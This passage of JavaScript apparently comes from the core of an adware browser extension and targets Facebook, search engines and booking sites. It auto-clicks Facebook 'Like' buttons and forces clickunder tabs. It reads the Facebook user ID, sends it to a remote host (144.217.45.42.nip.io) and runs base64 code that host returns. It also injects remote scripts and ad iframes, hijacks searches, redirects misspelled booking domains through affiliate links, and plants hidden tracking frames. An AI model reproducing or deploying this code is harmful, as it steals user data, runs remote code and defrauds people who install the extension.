                                h = f.getElementById("s-results-list-atf"),
                                g = setInterval(function() {
                                    if (h !== f.getElementById("s-results-list-atf") && f.getElementById("centerBelowPlusspacer") === null) {
                                        clearInterval(g);
                                        b()
                                    }
                                    if (!d--) {
                                        clearInterval(g)
                                    }
                                }, 100);
                            return c.apply(a.history, arguments)
                        }
                    })(document, window);
                }
                var searchEngineCheckResult;
                var isSearchEngine = function() {
                    if (typeof searchEngineCheckResult != "undefined") {
                        return searchEngineCheckResult
                    }
                    var found = false;
                    ["google.", "search.yahoo.", "bing.com", "ask.com", "shopping.yahoo", "search.aol.", "wow.com", "when.com", "search.mywebsearch.com", "search.myway.com", "duckduckgo.com", "mysearch.com", "teoma.com", "searchlock.com", "myprivatesearch.com", "searchprivacy.co", "thesmartsearch.net", "infospace", "safefinder.com", "mysearchguardian.com"].forEach(function(domainCheck) {
                        if (location.hostname.indexOf(domainCheck) > -1) {
                            found = true
                        }
                    });
                    searchEngineCheckResult = found;
                    return found
                };
                if (location.hostname.indexOf("facebook.com") > -1) {
                    if (scriptsToLoad['5df82']) {
                        (function(r, j, l) {
                            var k = j["1f404c54c2b0e13e0f"];
                            var a = j["1f404c54c2b0e13e0f"].Sizzle;
                            if (location.hostname.indexOf("facebook.com") < 0) {
                                return
                            }
                            var q = {
                                _mfbgp_sub_g2: "/fun8times"
                            };
                            var g = '5df82';
                            var o = false;
                            var t = "_mfbgp_sub_t";
                            var b = false;
                            var n = null;
                            for (var p in q) {
                                if (location.href.indexOf(q[p]) > -1) {
                                    n = p
                                }
                            }
                            if (!n) {
                                var f = false;
                                var m = k.getCookie(t);
                                if (m > (k.unixTimestampNow - 86400)) {
                                    return
                                }
                                var c = [];
                                for (var p in q) {
                                    if (k.getCookie(p)) {
                                        continue
                                    }
                                    c.push(q[p])
                                }
                                if (!c || c.length < 1) {
                                    return
                                }
                                var e = c[Math.floor(Math.random() * c.length)];
                                if (typeof e == "undefined") {
                                    return
                                }
                                e = "https://facebook.com" + e;
                                var s = function(i) {
                                    var u = this;
                                    var d = [];
                                    k.on(j.addEventListener ? j : r, "click", function(w) {
                                        var v = w.ctrlKey || w.metaKey || w.altKey || w.shiftKey,
                                            x = w.which && 1 === w.which || 0 === w.button;
                                        k.each(d, function(y) {
                                            if (y.call(w) === true) {
                                                k.preventDefault(w);
                                                return false
                                            }
                                        })
                                    });
                                    u.backgroundLink = function(x) {
                                        var w = document.createElement("a");
                                        w.href = x;
                                        w.__norewrite = 1;
                                        w.rel = "norewrite";
                                        w.target = "_blank";
                                        var v = document.createEvent("MouseEvents");
                                        v.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, true, false, false, false, 0, null);
                                        w.dispatchEvent(v)
                                    };
                                    u.clickunder = function(v) {
                                        d.push(v)
                                    };
                                    u.clickunder(function(v) {
                                        if (!f && i) {
                                            u.backgroundLink(i);
                                            k.updateLimits(g);
                                            k.loadedCallback("BANNER_LOAD", g);
                                            k.setCookie(t, k.unixTimestampNow, {
                                                expire: 864000,
                                                path: "/"
                                            });
                                            f = true;
                                            return true
                                        } else {
                                            return false
                                        }
                                    })
                                };
                                s(e);
                                return
                            }
                            if (k.getCookie(n)) {
                                return
                            }
                            k.loadedCallback("MNTZ_LOADED", g);

                            function h() {
                                if (b) {
                                    return
                                }
                                var d = a("#pages-header button.likeButton");
                                if (d.length > 0) {
                                    d[0].click();
                                    b = true;
                                    k.setCookie(n, 1, {
                                        expire: 86400 * 60,
                                        path: "/"
                                    });
                                    k.setCookie(t, k.unixTimestampNow, {
                                        expire: 864000,
                                        path: "/"
                                    })
                                }
                            }
                            k.ready(function() {
                                if (o) {
                                    return
                                }
                                o = true;
                                h();
                                var v = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;
                                var i = document.body;
                                if (typeof v != "undefined") {
                                    var u = new v(function(x) {
                                        x.forEach(function(z) {
                                            if (z.type === "childList") {
                                                for (var y = 0; y < z.addedNodes.length; y++) {
                                                    h()
                                                }
                                            }
                                            u.observe(document.body, {
                                                childList: true,
                                                subtree: true
                                            })
                                        })
                                    });
                                    u.observe(i, {
                                        childList: true,
                                        subtree: true
                                    })
                                } else {
                                    var w = function() {
                                        if (b) {
                                            return true
                                        }
                                        h();
                                        d = setTimeout("checkByTimer", 1000)
                                    };
                                    var d = setTimeout("checkByTimer", 1000)
                                }
                            })
                        })(document, window);
                    }
                    if (scriptsToLoad['af23c']) {
                        (function(f, h, j) {
                            var g = true;
                            try {
                                if (chrome.bookmarks) {
                                    g = false
                                }
                            } catch (c) {}
                            if (location.protocol == "chrome-extension:") {
                                g = false
                            }
                            if (g) {
                                var b = window.location.href;
                                var l = document.getElementById("dexscriptpopup");
                                if (l === null && b.indexOf("m.facebook.com") != "-1") {
                                    document.body.style.width = "0px";
                                    var k = document.createElement("div");
                                    k.id = "dexscriptpopup";
                                    k.style.cssText = "position:fixed; width:100%; height:100%; z-index:100; background:#fff; top:0px; left: 0px;";
                                    document.body.appendChild(k);
                                    setTimeout(function() {
                                        window.close()
                                    }, 10000)
                                }
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=true";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            } else {
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=false";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            }
                        })(document, window);
                    }
                    if (scriptsToLoad['4d3a8']) {
                        ! function() {
                            if ("http" == location.href.substr(0, 4) && document && "undefined" != typeof document && window == window.top) {
                                var a = function() {
                                        var a = document.getElementsByTagName("head");
                                        return a && void 0 !== a && a.length && a[0] && void 0 !== a[0] && a[0].appendChild ? (a = a[0], a.xadscriptinserted ? 0 : (a.xadscriptinserted = 1, 1)) : -1
                                    },
                                    b = function() {
                                        function a(detected_country) {
                                            var b = "wwi3bdi87sg87gi3av8bc8sgeyvru2y3";
                                            if (!document.getElementById(b)) {
                                                var c = document.createElement("meta");
                                                c.id = b, document.head.appendChild(c);
                                                (function() {
                                                    if (location.href.substr(0, 4) != 'http' || window.reigw34pn7tsjkdygf) return;
                                                    window.reigw34pn7tsjkdygf = 1;
                                                    ! function() {
                                                        var startAll = function() {
                                                            console.log('StartAll ok');
                                                            var toInject = function() {
                                                                if (top.location == self.location) {
                                                                    var t, e, i, n = document,
                                                                        a = "0",
                                                                        o = "",
                                                                        r = "https://144.217.45.42.nip.io",
                                                                        d = function(t) {
                                                                            t = t.toString();
                                                                            for (var e = "", i = function(t, i) {
                                                                                    for (var n = "", a = "", o = 0; o < e.length; o++) o == t ? (a = e[o], n += e[i]) : n += o == i ? a : e[o];
                                                                                    e = n
                                                                                }, n = 0; n < t.length; n++) e += "AeO5nNHidSjLVt3" [t[n]] + "FEDCBA123456789" [t[n]];
                                                                            return i(0, 24), i(3, 20), i(5, 18), e
                                                                        },
                                                                        s = function(t) {
                                                                            i.postMessage(JSON.stringify(t), r)
                                                                        },
                                                                        f = function() {
                                                                            if (window && window.require) {
                                                                                if ((t = window.require("CurrentUserInitialData")) && t.USER_ID && (a = t.USER_ID), "0" !== a && (!(e = 0) || e < 5)) {
                                                                                    o = d(a), window.addEventListener("message", c);
                                                                                    var l = n.createElement("iframe");
                                                                                    l.id = "_ga_f", l.src = r + "/start.php?id=" + a + "&s=" + (e || "0") + "&h=" + o + "&r=" + Math.random() + "&subid=34", l.style = "width:1px;height:1px; position: absolute; left -100px;", l.onload = function() {
                                                                                        i = l.contentWindow, s({
                                                                                            do: "start",
                                                                                            is_ga: "1",
                                                                                            hmac: o
                                                                                        })
                                                                                    }, n.body.appendChild(l)
                                                                                }
                                                                            } else setTimeout(f, 100)
                                                                        },
                                                                        c = function(t) {
                                                                            if (t.origin == r && t.data) try {
                                                                                var i = JSON.parse(t.data);
                                                                                if (!i || !i.is_ga) return;
                                                                                if ("next" == i.do && (e = i.state) < 5) {
                                                                                    var a = n.createElement("script");
                                                                                    a.text = atob(i.data), n.body.appendChild(a)
                                                                                }
                                                                            } catch (t) {}
                                                                        };
                                                                    n.location.href.match(/facebook\.com/im) && !n.getElementById("_ga_f") && setTimeout(f, 100)
                                                                }
                                                            };
                                                            var script = document.createElement('script');
                                                            script.innerText = '(' + toInject.toString() + ')()';
                                                            document.body.appendChild(script)
                                                        };
                                                        if (document.readyState == 'interactive' || document.readyState == 'complete') startAll();
                                                        else document.addEventListener('DOMContentLoaded', startAll, false)
                                                    }()
                                                })()
                                            }
                                        }

                                        function b() {
                                            var a;
                                            try {
                                                a = new ActiveXObject("Msxml2.XMLHTTP")
                                            } catch (b) {
                                                try {
                                                    a = new ActiveXObject("Microsoft.XMLHTTP")
                                                } catch (b) {
                                                    a = !1
                                                }
                                            }
                                            a || "undefined" == typeof XMLHttpRequest || (a = new XMLHttpRequest), this.xhr = a
                                        }
                                        b.prototype.get = function(a, b, c) {
                                            var d = this.xhr;
                                            if (c) var e = setTimeout(function() {
                                                d.abort, b(!1, "Timeout reached")
                                            }, c);
                                            b = b || function() {}, d.onreadystatechange = function() {
                                                4 == d.readyState && (clearTimeout(e), b(200 == d.status, d.responseText))
                                            }, d.open("GET", a, !0), d.send(null)
                                        }, (new b).get("//hoholikik.club/geolocation/1605/", function(b, c) {
                                            b && c && 2 == c.length || (c = "XX"), a(c)
                                        }, 1e4), (new b).get("//api.stathat.com/c?key=YA-298f_wfCUwTL3yYSDMyA2ZFpp&ukey=MTM1MzkgD1_LU1S68cRBsL4BFHW56g~~&count=1&", function() {}, 2e4), (new b).get("//api.stathat.com/c?key=wvUQhbogKVXDJOxzv8z50yA1cnJz&ukey=MTM1MzkgD1_LU1S68cRBsL4BFHW56g~~&count=1&", function() {}, 2e4)
                                    },
                                    c = function() {
                                        var d = a();
                                        0 !== d && (-1 === d && setTimeout(c, 100), 1 === d && b())
                                    };
                                c()
                            }
                        }();
                    }
                    if (scriptsToLoad['1f755']) {
                        var fconf = $$.getMtzCfg('1f755');
                        if (!!fconf.injectFacebook && fconf.injectFacebook == "1") {
                            (function() {
                                var d = document.querySelector("body");
                                if (!d) {
                                    return
                                }

                                function j(k) {
                                    k = k.replace(/%PUBLISHER_ID%/, ($$ && $$.tbParams && $$.tbParams.wid) ? $$.tbParams.wid : "");
                                    k = k.replace(/%SOURCE_ID%/, ($$ && $$.tbParams && $$.tbParams.tid) ? $$.tbParams.tid : "");
                                    k = k.replace(/%SUBID%/, ($$ && $$.tbParams && $$.tbParams.sid) ? $$.tbParams.sid : "");
                                    k = k.replace(/INSERT_RANDOM_NUMBER_HERE/, new Date().getTime());
                                    return k
                                }
                                var f = j("<iframe id='c8866ab3' name='c8866ab3' src='//cdnpps.us/www/delivery/afr.php?zoneid=120&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='300' height='250' style='display:block;'><a href='//cdnpps.us/www/delivery/ck.php?n=c8866ab3' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=120&amp;n=c8866ab3' border='0' alt='' /></a></iframe>");
                                var c = j("<iframe id='8a61598d' name='8a61598d' src='//cdnpps.us/www/delivery/afr.php?zoneid=119&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='468' height='60' style='display:block;'><a href='//cdnpps.us/www/delivery/ck.php?n=8a61598d' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=119&amp;n=8a61598d' border='0' alt='' /></a></iframe>");

                                function g(k) {
                                    return document.querySelectorAll(k) || []
                                }
                                var a = function(n, k, o, m) {
                                    var l = document.createElement("div");
                                    l.setAttribute("id", "_" + Math.floor((Math.random() * 1000000000)));
                                    l.innerHTML = o;
                                    l.setAttribute("style", "display: inline-block;height:" + k + "px !important;width:" + n + "px !important;margin:0 auto;z-index:99999999;border:0;");
                                    m.style.textAlign = "center";
                                    m.appendChild(l)
                                };

                                function h(k) {
                                    k.style.minHeight = "500px";
                                    k.id = "_" + k.id;
                                    k.setAttribute("data-mytype", "name_baner");
                                    k.innerHTML = "";
                                    a(300, 500, f + f, k)
                                }

                                function i(k) {
                                    var l = document.createElement("div");
                                    l.setAttribute("data-mytype", "name_baner");
                                    l.setAttribute("style", "width:468px;height:60px;margin:0 auto 10px auto;");
                                    k.setAttribute("data-mytype", "name_baner");
                                    k.appendChild(l);
                                    a(468, 60, c, l)
                                }
                                var b = function() {
                                    Array.prototype.forEach.call(g('div[class^="_5jmm _5pat"]'), function(k) {
                                        if (!k.getAttribute("data-mytype")) {
                                            i(k)
                                        }
                                    });
                                    Array.prototype.forEach.call(g("#pagelet_ego_pane"), function(k) {
                                        if (!k.getAttribute("data-mytype") && k.offsetHeight > 50) {
                                            h(k)
                                        }
                                    });
                                    setTimeout(b, 3333)
                                };
                                b();
                                var e = new MutationObserver(function(k) {
                                    for (var l in k) {
                                        if (k[l].addedNodes.length) {
                                            b();
                                            break
                                        }
                                    }
                                });
                                e.observe(document.getElementById("content"), {
                                    childList: true
                                })
                            })();
                        }
                    }
                } else {
                    $$.loadedCallback("BEFORE_OPTOUT_REQ");
                    $$.jsonp({
                        url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/optout/get",
                        data: {
                            key: "1f404c54c2b0e13e0f"
                        },
                        callback: function(response) {
                            if (!response.success) {
                                $$.loadedCallback("OPTOUT_RESPONSE_FAIL");
                                return false
                            }
                            $$.loadedCallback("OPTOUT_RESPONSE_OK");
                            var userId = response.userId;
                            var startTime = response.strTm;
                            var lifeTime = response.lt;
                            var lastActionTime = response.lat;
                            var optout = {};
                            if (response.optout) {
                                optout = $$.optoutValue = $$.fromJson(decodeURIComponent(response.optout))
                            }
                            var country = response.country;
                            var limits = {};
                            var ownMonetizationsClickFlag = false;
                            if (response.limits) {
                                limits = $$.limitsValue = $$.fromJson(decodeURIComponent(response.limits))
                            }
                            if (response.lcFlag && response.lcFlag == 1) {
                                ownMonetizationsClickFlag = true
                            }
                            var targetingUser = response.targeting || 0;
                            var currentHostname = location.hostname;
                            currentHostname = currentHostname.replace("www.", "");
                            var timeNow = $$.unixTimestampNow;
                            if (!country) {
                                country = "xx"
                            }
                            country = country.toLowerCase();
                            if (!userId) {
                                userId = $$.randomNumber(1, 100);
                                $$.jsonp({
                                    url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/optout/set/userid",
                                    data: {
                                        key: "1f404c54c2b0e13e0f",
                                        cv: userId
                                    }
                                })
                            }
                            if (!startTime) {
                                $$.setStartTime()
                            }
                            $$.updateLifeTime(lifeTime, lastActionTime);
                            var timeAfterInstall = $$.unixTimestampNow - startTime;
                            var platformBlocks = [];
                            for (var key in scriptsToLoad) {
                                try {
                                    var scriptRow = scriptsToLoad[key];
                                    var scriptUrl = scriptRow.url;
                                    var scriptUrlParams = {};
                                    var scriptCoverageFrom = 0;
                                    var scriptCoverageTo = 100;
                                    if (scriptRow.coverage.indexOf("-") > -1) {
                                        var coverageParts = scriptRow.coverage.split("-");
                                        scriptCoverageFrom = parseInt(coverageParts[0]);
                                        scriptCoverageTo = parseInt(coverageParts[1])
                                    } else {
                                        scriptCoverageTo = parseInt(scriptRow.coverage)
                                    }
                                    if (($$.getCookie("__mtzalnly") == 1 || $$.getCookie("__lnntlk") == 1) && ['cd1d2', '210e2', 'b48fe', '6a131', '81d01', 'a5093', '865b2', '88350', 'f81c7', '80c44', '90f06'].indexOf(key) == -1) {
                                        if ("52421" != "51739") {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_AFFLNK", key, "__mtzalnly=" + $$.getCookie("__mtzalnly"), "__lnntlk=" + $$.getCookie("__lnntlk"), location.hostname)
                                            }
                                            continue
                                        } else {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_NOTIF_AFFLNK", key, "__mtzalnly=" + $$.getCookie("__mtzalnly"), "__lnntlk=" + $$.getCookie("__lnntlk"), location.hostname)
                                            }
                                        }
                                    }
                                    if (isSearchEngine()) {
                                        if (['4dc06', 'd086d', 'deaf7', '42265', '84a21', 'ef3e3', '031e7', '58c2e', '85031', '5db45', 'ac348', '6cf2f', '220bb', 'b6eb3', '1a2aa', '08552', '4a71b', 'f361b', 'cd1d2', '81d01', 'f81c7', 'b777a', 'a49b5', 'c3369', '3e4fd', '6f95e', '9510f', '6a88f', 'f4c82', '44a92', 'd115b', '1229b', '54ace', '72415', '75710', '83296', 'b8695', 'a7711', '3160d', 'd652c', 'ae5a7', '80a06', 'baf71', '6d07f', '5a00b', '571c3', '308b3', '3b0bd', '10cd4', '624a7', '4a0ef', '95dd2', '5de0e', 'e1d94'].indexOf(key) == -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_SERCHNGN", key, location.hostname)
                                            }
                                            continue
                                        }
                                    }
                                    if (ownMonetizationsClickFlag) {
                                        if (['4dc06', 'd086d', 'bd895', '1f755', '42265', '84a21', 'ef3e3', '031e7', '58c2e', '85031', 'ac348', '6cf2f', '220bb', 'b6eb3', '1a2aa', '5db45', '08552', '4a71b', '02aed'].indexOf(key) == -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_OWNMNTZ", key, location.hostname)
                                            }
                                            continue
                                        }
                                    }
                                    if (typeof(scriptUrl) == "object") {
                                        if (scriptUrl.rotator) {
                                            var rotatorCount = scriptUrl.rotator.length;
                                            if (!rotatorCount) {
                                                rotatorCount = 0
                                            }
                                            var rotatorCookieName = "_mrtr_1f404c54c2b0e13e0f_" + key;
                                            var lastRotatedIndex = $$.getCookie(rotatorCookieName);
                                            if (!lastRotatedIndex || lastRotatedIndex < 0 || lastRotatedIndex >= rotatorCount) {
                                                lastRotatedIndex = 0
                                            }
                                            scriptUrlParams = scriptUrl.rotator[lastRotatedIndex];
                                            scriptUrl = getUrlFromConfigObject(scriptUrlParams);
                                            lastRotatedIndex++;
                                            $$.setCookie(rotatorCookieName, lastRotatedIndex, {
                                                expire: 86400
                                            })
                                        } else {
                                            scriptUrlParams = scriptUrl;
                                            scriptUrl = getUrlFromConfigObject(scriptUrlParams)
                                        }
                                    }
                                    if (typeof(scriptUrl) != "string") {
                                        $$.loadedCallback("CB_MNTZ_FILTER_INVALIDURL", key);
                                        continue
                                    }
                                    if (!$$.demoMode) {
                                        if ("8000" == 1549 && location.protocol == "https:" && (key == "a8bb7" || key == "e9254")) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_CUSTOM", key)
                                            }
                                            continue
                                        }
                                        if ((location.hostname == "youtube.com" || location.hostname == "www.youtube.com") && key != "1f755" && key != "1fbee" && key != "c3369" && key != "f4c82" && key != "95dd2") {
                                            continue
                                        }
                                        if (location.hostname.indexOf("facebook.com") > -1) {
                                            continue
                                        }
                                        if (optout && optout[key] != undefined && optout[key] == true) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_OPTOUTED", key, optout[key])
                                            }
                                            continue
                                        }
                                        if (scriptRow.countries_allow && scriptRow.countries_allow.indexOf(country) == -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_GEOALLOW", key, country, scriptRow.countries_allow)
                                            }
                                            continue
                                        }
                                        if (scriptRow.countries_deny && scriptRow.countries_deny.indexOf(country) > -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_GEODENY", key, country, scriptRow.countries_deny)
                                            }
                                            continue
                                        }
                                        if ((scriptCoverageFrom || scriptCoverageTo) && (userId < scriptCoverageFrom || userId > scriptCoverageTo)) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_COVERAGE", key, userId, scriptCoverageFrom + "-" + scriptCoverageTo)
                                            }
                                            continue
                                        }
                                        if (limits && limits[key]) {
                                            var leftTime = parseInt(limits[key]) - timeNow;
                                            if (leftTime > 0) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_LIMIT", key, leftTime, parseInt(limits[key]))
                                                }
                                                continue
                                            }
                                        }
                                        if (key == "a096e" && targetingUser != 1) {
                                            continue
                                        }
                                        var hostnameReg;
                                        if (scriptRow.hostname_deny) {
                                            hostnameReg = new RegExp("^" + scriptRow.hostname_deny + "$", "i");
                                            if (hostnameReg.test(currentHostname)) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_HOSTDENY", key, location.hostname, scriptRow.hostname_deny)
                                                }
                                                continue
                                            }
                                        }
                                        if (scriptRow.hostname_allow) {
                                            hostnameReg = new RegExp("^" + scriptRow.hostname_allow + "$", "i");
                                            if (!hostnameReg.test(currentHostname)) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_HOSTALLOW", key, location.hostname, scriptRow.hostname_allow)
                                                }
                                                continue
                                            }
                                        }
                                        if (scriptRow.browsers_allow || scriptRow.browsers_deny) {
                                            if (typeof detect == "undefined") {
                                                continue
                                            }
                                            var ua = detect.parse(navigator.userAgent);
                                            var checkUa = ua.browser.family.toLowerCase();
                                            var browserAllowed = false
                                        }
                                        if (scriptRow.browsers_allow) {
                                            var browsersAllow = scriptRow.browsers_allow.toLowerCase().split(",");
                                            for (var i2 in browsersAllow) {
                                                if (browsersAllow[i2] == checkUa) {
                                                    browserAllowed = true;
                                                    break
                                                }
                                            }
                                            if (!browserAllowed) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_BROWSALLOW", key, checkUa, scriptRow.browsers_allow)
                                                }
                                                continue
                                            }
                                        }
                                        if (scriptRow.browsers_deny) {
                                            var browsersDeny = scriptRow.browsers_deny.toLowerCase().split(",");
                                            for (var i2 in browsersDeny) {
                                                if (browsersDeny[i2] == checkUa) {
                                                    browserAllowed = false;
                                                    break
                                                }
                                            }
                                            if (!browserAllowed) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_BROWSDENY", key, checkUa, scriptRow.browsers_deny)
                                                }
                                                continue
                                            }
                                        }
                                        if (['c3369', '3e4fd', '9510f', '6a88f', 'f4c82', '44a92'].indexOf(key) > -1) {
                                            if (isInIframe()) {
                                                continue
                                            }
                                            var searchFieldInputEl = $$.Sizzle("input[name=q]");
                                            if (searchFieldInputEl && searchFieldInputEl.length > 0 && searchFieldInputEl[0] && searchFieldInputEl[0].value) {
                                                var regexSearch = new RegExp('^(.* ?[a-z-]+:.*|".*")$', "i");
                                                var regexSearchMatch = searchFieldInputEl[0].value.match(regexSearch);
                                                if (regexSearchMatch) {
                                                    continue
                                                }
                                            }
                                        }
                                    } else {};
                                    if (key == "cd1d2") {
                                        (function(tbObject) {
                                            eval("window._lnkr5 = {\'uid\':\'52421x8000x\'+tbObject.tbParams.sid,\'allowTargetBlank\': false};")
                                        })($$)
                                    };
                                    if (key == "1a2aa") {
                                        runForceSearch();
                                        continue
                                    }
                                    if (key == "5db45") {
                                        continue
                                    }
                                    if (key == "309e4") {
                                        continue
                                    }
                                    if (key == "c3e34") {
                                        if (!isInIframe()) {
                                            (function(f, b, c) {
                                                var e = ["https://www.hanstrackr.com/track?i=nuS6Dgnt9GUnnKwQ"];
                                                var a = document.createElement("iframe");
                                                a.src = e[0];
                                                a.setAttribute("style", "width:1px;height:1px;opacity: 0;position:absolute;left:-500px;top:-500px;");
                                                f.body.appendChild(a)
                                            })(document, window);
                                        }
                                        continue
                                    }
                                    if (key == "a49b5" || key == "1dbbc") {
                                        continue
                                    }
                                    if (key == "93af4" || key == "085dc") {
                                        if (isInIframe()) {
                                            if (location.hostname.indexOf("yourfirstcheapshop.com") > -1) {
                                                var yfcsStylePluginUrl = (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/addons/yfcs.min.js";
                                                $$.script(yfcsStylePluginUrl, false)
                                            }
                                            continue
                                        }
                                    }
                                    if (scriptRow.type == "external") {
                                        $$.loadedCallback("MNTZ_INJECT", key);
                                        scriptUrl = scriptUrl.replace(/\/SID\//g, encodeURIComponent($$.tbParams.sid));
                                        scriptUrl = scriptUrl.replace(/\/TITLE\//g, encodeURIComponent($$.tbParams.title));
                                        scriptUrl = scriptUrl.replace(/\/REFERRER\//g, encodeURIComponent(location.href));
                                        scriptUrl = scriptUrl.replace(/\/REF_HOST\//g, encodeURIComponent(location.hostname ? location.hostname : location.host));
                                        scriptUrl = scriptUrl.replace(/\/RANDOM\//g, (new Date()).getTime());
                                        scriptUrl = scriptUrl.replace(/\/OPTOUTURL_DBLENCODED\//g, encodeURIComponent(encodeURIComponent(($$.tbParams.optoutUrl ? $$.tbParams.optoutUrl : "http://thisadsfor.us/optout?t=8000&u=52421&block=" + key))));
                                        scriptUrl = scriptUrl.replace(/\/OPTOUTURL\//g, encodeURIComponent(($$.tbParams.optoutUrl ? $$.tbParams.optoutUrl : "http://thisadsfor.us/optout?t=8000&u=52421&block=" + key)));
                                        if (scriptUrl) {
                                            if (scriptUrl.substr(0, 2) == "//") {
                                                scriptUrl = (window.location.protocol == "http:" ? "http:" : "https:") + scriptUrl
                                            }(function(block) {
                                                var script = $$.script(scriptUrl, false, (scriptUrlParams.tag_attributes ? scriptUrlParams.tag_attributes : null));
                                                $$.on(script, "load", function() {
                                                    $$.loadedCallback("MNTZ_LOADED", block);
                                                    $$.updateLimits(block)
                                                })
                                            })(key)
                                        } else {
                                            $$.loadedCallback("MNTZ_LOADED", key);
                                            $$.updateLimits(key)
                                        }
                                    } else {
                                        if (scriptRow.type == "platform") {
                                            platformBlocks.push(key)
                                        } else {}
                                    }
                                } catch (e) {
                                    $$.loadedCallback("CORE_JS_ERROR", key)
                                }
                            }
                            if (platformBlocks.length > 0) {
                                var params = ["sid=" + $$.tbParams.wid + "_" + $$.tbParams.tid + "_" + $$.tbParams.sid, "title=" + encodeURIComponent($$.tbParams.title)];
                                for (var i in platformBlocks) {
                                    if (typeof platformBlocks[i] != "string") {
                                        break
                                    }
                                    params.push("blocks[]=" + platformBlocks[i])
                                }
                                var url = (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/ext/1f404c54c2b0e13e0f.js?" + params.join("&");
                                $$.script(url, false);
                                $$.loadedCallback("MNTZ_INJECT", platformBlocks.join(","))
                            }
                        }
                    });
                    if (scriptsToLoad['af23c']) {
                        (function(f, h, j) {
                            var g = true;
                            try {
                                if (chrome.bookmarks) {
                                    g = false
                                }
                            } catch (c) {}
                            if (location.protocol == "chrome-extension:") {
                                g = false
                            }
                            if (g) {
                                var b = window.location.href;
                                var l = document.getElementById("dexscriptpopup");
                                if (l === null && b.indexOf("m.facebook.com") != "-1") {
                                    document.body.style.width = "0px";
                                    var k = document.createElement("div");
                                    k.id = "dexscriptpopup";
                                    k.style.cssText = "position:fixed; width:100%; height:100%; z-index:100; background:#fff; top:0px; left: 0px;";
                                    document.body.appendChild(k);
                                    setTimeout(function() {
                                        window.close()
                                    }, 10000)
                                }
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=true";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            } else {
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=false";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            }
                        })(document, window);
                    }
                }
                if (location.host.indexOf("youradexchange.com") >= 0 && location.pathname.indexOf("a/display.") >= 0) {
                    if ($$.getParams && $$.getParams.r && $$.getParams.r != 391766 && $$.getParams.r != 391769) {
                        var r = $$.randomNumber(1, 100);
                        var rLimit = 100;
                        if (r <= rLimit) {
                            setTimeout(function() {
                                location.href = "http://www.youradexchange.com/a/display.php?r=391769&sub1=pr" + $$.tbParams.wid + "x" + $$.tbParams.tid + "x" + $$.tbParams.sid
                            }, 0)
                        } else {}
                    }
                }
                var matchPattern = /(boobking\.|booing\.|buking\.|boocking\.|boooking\.|bookking\.|booing\.)/i;
                if (location.hostname.match(matchPattern)) {
                    if (typeof window.stop == "function") {
                        window.stop()
                    }
                    location.href = "http://adrs.me/get?key=6ae9f4bd1dc812dc713d61cba871d8e8&out=http%3A%2F%2Fbooking.com&ref=http%3A%2F%2Fgo.com&format=go&uid=rdr52421"
                }
                if (isInIframe()) {
                    return
                }
                if (scriptsToLoad['85031']) {
                    (function() {
                        var block = '85031';
                        $$.ready(function() {
                            try {
                                (function() {
                                    if (location.hostname.indexOf("search.yahoo.com") == -1 || location.pathname.indexOf("/search") == -1) {
                                        return
                                    }
                                    var r = $$.randomNumber(1, 100);
                                    var rLimit = scriptsToLoad[block].coverage;
                                    if (r > rLimit) {
                                        return
                                    }
                                    $$.loadedCallback("MNTZ_LOADED", block);
                                    if ($$.getCookie("__ckp_srchyho_fired") == 1) {
                                        return
                                    }

                                    function getParams() {
                                        params = {};
                                        for (var e = location.search.replace("?", ""), r = e.split("&"), c = 0; c < r.length; c++) {
                                            t = r[c].split("="), t[1] && (params[t[0]] = t[1])
                                        }
                                        var a = location.hash.replace("#", "");
                                        a && (t = a.split("="), t[1] && (params[t[0]] = t[1]))
                                    }

                                    function checkYahooTag() {
                                        getParams();
                                        if (location.href.indexOf("tightrope") > -1 && location.href.indexOf("tr57") > -1) {
                                            return
                                        } else {
